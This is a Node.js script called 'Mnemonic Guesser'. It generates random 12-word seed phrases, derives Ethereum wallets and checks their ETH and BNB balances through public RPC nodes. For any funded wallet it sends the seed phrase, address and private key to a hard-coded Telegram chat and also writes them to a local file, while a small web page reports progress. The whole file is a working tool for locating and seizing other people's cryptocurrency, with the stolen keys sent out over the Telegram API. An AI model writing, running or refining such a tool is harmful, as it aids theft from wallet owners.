const fs = require('fs');
const http = require('http');
const https = require('https');
const { ethers } = require('ethers');

process.on('uncaughtException', (err) => {
  console.error('[FATAL] uncaughtException:', err.stack || err.message);
});
process.on('unhandledRejection', (reason) => {
  console.error('[FATAL] unhandledRejection:', reason?.stack || reason);
});

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = '5053683608';

const NUM_LOOPS = 8;
const BATCH_SIZE = 50;
const DEFAULT_PATH = "m/44'/60'/0'/0/0";

let checked = 0;
let found = 0;
const startTime = Date.now();
const seen = new Set();

// ── HTTP helpers ──────────────────────────────────────────────────────────────

function httpsPost(hostname, path, body) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const req = https.request(
      {
        hostname, path, method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(data),
        },
      },
      (res) => {
        let raw = '';
        res.on('data', (c) => { raw += c; });
        res.on('end', () => {
          try { resolve(JSON.parse(raw)); }
          catch (e) { reject(new Error(raw.slice(0, 120))); }
        });
      }
    );
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

// ── Batch RPC balance check ───────────────────────────────────────────────────

async function batchBalances(hostname, path, addresses) {
  const batch = addresses.map((addr, i) => ({
    jsonrpc: '2.0', method: 'eth_getBalance',
    params: [addr, 'latest'], id: i,
  }));

  try {
    const results = await Promise.race([
      httpsPost(hostname, path, batch),
      new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 10000)),
    ]);

    if (!Array.isArray(results)) return addresses.map(() => 0);

    const balances = new Array(addresses.length).fill(0);
    for (const r of results) {
      if (r.result) balances[r.id] = parseInt(r.result, 16) / 1e18;
    }
    return balances;
  } catch (_) {
    return addresses.map(() => 0);
  }
}

// ── Telegram ──────────────────────────────────────────────────────────────────

function sendTelegramMessage(text) {
  const body = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' });
  const req = https.request(
    {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    },
    (res) => { res.on('data', () => {}); }
  );
  req.on('error', (e) => console.error('Telegram error:', e.message));
  req.write(body);
  req.end();
}

// ── Generate + check one batch ────────────────────────────────────────────────

async function runBatch() {
  const wallets = [];

  for (let i = 0; i < BATCH_SIZE; i++) {
    const words = Array.from({ length: 12 }, () =>
      ethers.wordlists.en.getWord(Math.floor(Math.random() * 2048))
    );
    const phrase = words.join(' ');
    if (seen.has(phrase)) continue;

    let valid = false;
    try { valid = ethers.Mnemonic.isValidMnemonic(phrase); } catch (_) {}
    if (!valid) continue;

    seen.add(phrase);

    try {
      const wallet = ethers.HDNodeWallet.fromPhrase(phrase, '', DEFAULT_PATH);
      wallets.push({ mnemonic: phrase, address: wallet.address, privateKey: wallet.privateKey });
    } catch (_) {}
  }

  checked += wallets.length;

  if (wallets.length > 0) {
    const addresses = wallets.map((w) => w.address);

    const [ethBalances, bscBalances] = await Promise.all([
      batchBalances('ethereum.publicnode.com', '/', addresses),
      batchBalances('bsc-dataseed.binance.org', '/', addresses),
    ]);

    for (let i = 0; i < wallets.length; i++) {
      const ethBal = ethBalances[i];
      const bscBal = bscBalances[i];

      if (ethBal > 0 || bscBal > 0) {
        found++;
        const { mnemonic, address, privateKey } = wallets[i];
        const balanceLines = [];
        if (ethBal > 0) balanceLines.push(`💎 ETH: ${ethBal.toFixed(6)} ETH`);
        if (bscBal > 0) balanceLines.push(`🟡 BNB: ${bscBal.toFixed(6)} BNB`);

        sendTelegramMessage(
          `🔑 <b>Mnemonic Found!</b>\n\n` +
          `📝 <b>Mnemonic:</b>\n<code>${mnemonic}</code>\n\n` +
          `📬 <b>Address:</b>\n<code>${address}</code>\n\n` +
          `💰 <b>Balance:</b>\n${balanceLines.join('\n')}\n\n` +
          `🔐 <b>Private Key:</b>\n<code>${privateKey}</code>`
        );

        const raw = fs.existsSync('./accounts.json') ? fs.readFileSync('./accounts.json') : '[]';
        const accounts = JSON.parse(raw);
        accounts.push({ mnemonic, address, privateKey, ethBal, bscBal });
        fs.writeFileSync('./accounts.json', JSON.stringify(accounts, null, 2));
      }
    }
  }

  // تنازل عن event loop ثم أعد التشغيل
  setImmediate(runBatch);
}

// ── Progress ──────────────────────────────────────────────────────────────────

setInterval(() => {
  const elapsed = Math.max(1, Math.floor((Date.now() - startTime) / 1000));
  const rate = (checked / elapsed).toFixed(1);
  console.log(`[${elapsed}s] Checked: ${checked.toLocaleString()} | Found: ${found} | Speed: ${rate}/s`);
}, 5000);

// ── Web Server ────────────────────────────────────────────────────────────────

http.createServer((req, res) => {
  const elapsed = Math.max(1, Math.floor((Date.now() - startTime) / 1000));
  const rate = (checked / elapsed).toFixed(1);
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(`<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Mnemonic Guesser</title>
<style>
  body{background:#0d1117;color:#e6edf3;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
  .box{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:40px 60px;text-align:center}
  h1{margin:0 0 30px;font-size:1.4rem;color:#58a6ff}
  .row{display:flex;gap:40px;justify-content:center}
  .card{background:#0d1117;border-radius:8px;padding:20px 30px}
  .label{font-size:.75rem;color:#8b949e;margin-bottom:6px}
  .value{font-size:1.8rem;font-weight:bold;color:#e6edf3}
  .value.green{color:#3fb950}
  .value.yellow{color:#d29922}
</style></head><body><div class="box">
<h1>🚀 Mnemonic Guesser</h1>
<div class="row">
  <div class="card"><div class="label">🔍 Checked</div><div class="value">${checked.toLocaleString()}</div></div>
  <div class="card"><div class="label">✅ Found</div><div class="value green">${found}</div></div>
  <div class="card"><div class="label">⚡ Speed</div><div class="value yellow">${rate}/s</div></div>
  <div class="card"><div class="label">⏱ Time</div><div class="value">${elapsed}s</div></div>
</div></div></body></html>`);
}).listen(process.env.PORT || 5000, '0.0.0.0', () => {
  console.log(`Web server on port ${process.env.PORT || 5000}`);
});

// ── تشغيل الحلقات ────────────────────────────────────────────────────────────

console.log(`Starting ${NUM_LOOPS} loops...`);
for (let i = 0; i < NUM_LOOPS; i++) {
  setTimeout(runBatch, i * 50);
}
